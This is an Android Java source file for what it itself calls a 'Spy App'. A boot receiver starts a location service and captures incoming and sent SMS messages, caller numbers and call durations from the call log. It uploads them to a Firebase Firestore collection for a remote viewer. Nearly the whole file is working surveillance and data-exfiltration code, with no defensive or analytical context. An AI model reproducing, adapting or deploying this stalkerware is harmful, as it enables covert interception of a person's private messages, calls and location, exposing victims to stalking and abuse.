package com.example.spyapp;

import android.content.BroadcastReceiver;
import android.content.ContentResolver;
import android.content.Context;
import android.content.Intent;
import android.database.ContentObserver;
import android.database.Cursor;
import android.net.Uri;
import android.os.Build;
import android.os.Bundle;
import android.os.Handler;
import android.provider.CallLog;
import android.telephony.SmsMessage;
import android.telephony.TelephonyManager;
import androidx.annotation.RequiresApi;
import com.google.firebase.firestore.FirebaseFirestore;
import java.util.Calendar;
import java.util.HashMap;
import java.util.Map;

public class StartUpReceiver extends BroadcastReceiver {
    Context Cont;
    private FirebaseFirestore mFirestore;
    String NOTIFICATION_TITLE;
    String NOTIFICATION_MESSAGE;
    String TOPIC;
    Boolean flag = true;

    @RequiresApi(api = Build.VERSION_CODES.M)
    @Override
    public void onReceive (Context context, Intent intent)
    {
        Cont = context;
        String Action = intent.getAction ();
        if (Action == Intent.ACTION_BOOT_COMPLETED) {
            DoBoot();
        }
        if (Action == "android.provider.Telephony.SMS_RECEIVED") {
            DoBoot();
            DoSMS(intent);
        }
        if (Action == "android.intent.action.PHONE_STATE") {
            DoBoot();
            DoPhone(intent);
        }

    }

    @RequiresApi(api = Build.VERSION_CODES.M)
    private void DoBoot()
    {
        if(flag) {
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                Cont.startForegroundService(new Intent(Cont, LocationService.class));
            }
            ContentResolver contentResolver = Cont.getContentResolver();
            contentResolver.registerContentObserver(Uri.parse("content://sms"), true, new MyObserver(new Handler()));
            flag = false;
        }
    }


    @RequiresApi(api = Build.VERSION_CODES.M)
    void DoSMS (Intent SmsInt)
    {
        Bundle bundle = SmsInt.getExtras ();
        SmsMessage[] Messages = null;
        String SmsSender;
        String ToActivity;
        if (bundle != null)
        {
            try
            {
                ToActivity = "";
                Object[] pdus = (Object[]) bundle.get("pdus");
                Messages = new SmsMessage[pdus.length];
                for(int i=0; i<Messages.length; i++)
                {
                    Messages[i] = SmsMessage.createFromPdu ((byte[]) pdus[i], bundle.getString("format"));
                    SmsSender = Messages[i].getOriginatingAddress();
                    if (i == 0)
                        ToActivity = "From: " + SmsSender + ",\nMessage: ";
                    String SmsBody = Messages[i].getMessageBody();
                    ToActivity = ToActivity + SmsBody;
                }
                BroadcastMessage ("SMS", ToActivity);
            }
            catch(Exception e)
            {
            }
        }
    }

    void DoPhone (Intent PhoneInt)
    {
        String State = PhoneInt.getStringExtra (TelephonyManager.EXTRA_STATE);
        String Caller= PhoneInt.getStringExtra (TelephonyManager.EXTRA_INCOMING_NUMBER);
        if (State.equals (TelephonyManager.EXTRA_STATE_RINGING))
        {
            if (Caller != null)
            {
                BroadcastMessage ("PHONE", "Call from " + Caller);
            }
        }
        if (State.equals (TelephonyManager.EXTRA_STATE_OFFHOOK))
        {
            if (Caller != null)
            {
                BroadcastMessage ("PHONE", "Speaking to " + Caller);
            }
        }
        if (State.equals (TelephonyManager.EXTRA_STATE_IDLE))
        {
            if (Caller != null)
            {
                String callDuration = "";
                Uri contacts = CallLog.Calls.CONTENT_URI;
                Cursor managedCursor = Cont.getContentResolver().query(
                        contacts, null, null, null, null);
                int duration = managedCursor.getColumnIndex( CallLog.Calls.DURATION);
                while (managedCursor.moveToNext()) {
                    callDuration = managedCursor.getString(duration);
                }
                BroadcastMessage("PHONE", "Call to " + Caller + " ended.\nDuration: " + callDuration + " sec");
                managedCursor.close();
            }
        }
    }

    class MyObserver extends ContentObserver {

        String lastSmsId;

        public MyObserver(Handler handler) {
            super(handler);
        }

        @Override
        public void onChange(boolean selfChange) {
            String SentTo;
            String message;
            String ToActivity = "";
            Uri uriSMSURI = Uri.parse("content://sms/sent");
            Cursor cur = Cont.getContentResolver().query(uriSMSURI, null, null, null, null);
            cur.moveToNext();
            String id = cur.getString(cur.getColumnIndex("_id"));
            if (smsChecker(id)) {
                SentTo = cur.getString(cur.getColumnIndex("address"));
                message = cur.getString(cur.getColumnIndex("body"));
                ToActivity = "Sent To " + SentTo + ",\nMessage: " + message + "";
                NOTIFICATION_TITLE = "From Your Spy App (New SMS)";
                NOTIFICATION_MESSAGE = ToActivity;
                Map<String, Object> notificationMessage = new HashMap<>();
                notificationMessage.put("datetime", Calendar.getInstance().getTime().toString());
                notificationMessage.put("title", NOTIFICATION_TITLE);
                notificationMessage.put("message", NOTIFICATION_MESSAGE);
                mFirestore = FirebaseFirestore.getInstance();
                mFirestore.collection("Users/userABC/Notifications").add(notificationMessage);
            }

        }

        public boolean smsChecker(String smsId) {
            boolean flagSMS = true;

            if (smsId.equals(lastSmsId)) {
                flagSMS = false;
            } else {
                lastSmsId = smsId;
            }

            return flagSMS;
        }

    }

    void BroadcastMessage(String Type, String Mess)
    {
        Intent BroadInt = new Intent ("Fantom-Message");
        BroadInt.putExtra ("To:", Type);
        BroadInt.putExtra ("Message:", Mess);
        TOPIC = "/topics/userABC";
        if (Type.equals("SMS")) {
            NOTIFICATION_TITLE = "From Your Spy App (New SMS)";
            NOTIFICATION_MESSAGE = Mess;
        }
        if (Type.equals("PHONE")) {
            NOTIFICATION_TITLE = "From Your Spy App (New CALL)";
            NOTIFICATION_MESSAGE = Mess;
        }

        Map<String, Object> notificationMessage = new HashMap<>();
        notificationMessage.put("datetime", Calendar.getInstance().getTime().toString());
        notificationMessage.put("title", NOTIFICATION_TITLE);
        notificationMessage.put("message", NOTIFICATION_MESSAGE);
        mFirestore = FirebaseFirestore.getInstance();
        mFirestore.collection("Users/userABC/Notifications").add(notificationMessage);
    }

}


